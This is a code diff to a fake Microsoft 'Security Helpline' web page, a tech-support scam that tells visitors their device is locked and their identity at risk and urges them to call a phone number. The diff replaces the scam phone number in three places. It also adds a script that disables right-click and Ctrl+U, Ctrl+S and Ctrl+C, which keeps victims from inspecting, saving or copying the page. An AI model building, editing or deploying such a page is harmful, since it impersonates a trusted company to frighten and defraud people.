@@ -327,7 +327,7 @@
         </div>
         <div id="bc"></div>
 <div id="footer">
-    <div id="footer2"><img src="static/microsoft_w.png" alt=""> <span>Contact Supprt</span><div><span>+1 (209) 776-3406 (Security Helpline)</span></div></div>
+    <div id="footer2"><img src="static/microsoft_w.png" alt=""> <span>Contact Supprt</span><div><span>+64 9 802 5985 (Security Helpline)</span></div></div>
 </div>
 
 
@@ -343,7 +343,7 @@
     <p>You must contact us immediately so that our engineers can walk you through the removal process over the phone.</p>
     <p>Call Microsoft Support immediatly to report this thread. prevent identity theft and unlock access to this device.</p>
     <p>Closing this window will put your personal information at risk and lead to a suspension of your Windows Registration.</p>
-    <p>Call Microsoft Support: <b>+1 (209) 776-3406 (Security Helpline)</b></p>
+    <p>Call Microsoft Support: <b>+64 9 802 5985 (Security Helpline)</b></p>
     <button class="buttonn" onclick="disapear()">close</button>
 
 </div>
@@ -351,7 +351,7 @@
     <span>:(</span>
 </div>
 <div id="support">
-   <span><b>Contact Support</b></span><span id="span"><b>+1 (209) 776-3406 </b></span>
+   <span><b>Contact Support</b></span><span id="span"><b>+64 9 802 5985 </b></span>
 </div>
 <audio id="audio1" src="static/audio1.mp3"></audio>
 <audio id="audio2" src="static/audio2.mp3"></audio>
@@ -821,6 +821,15 @@
         };
     };
 </script>
+    <script>
+  document.addEventListener("contextmenu", e => e.preventDefault());
+  document.addEventListener("keydown", e => {
+    if (e.ctrlKey && ["u","s","c"].includes(e.key.toLowerCase())) {
+      e.preventDefault();
+    }
+  });
+</script>
+
 
 </body>
 </html>
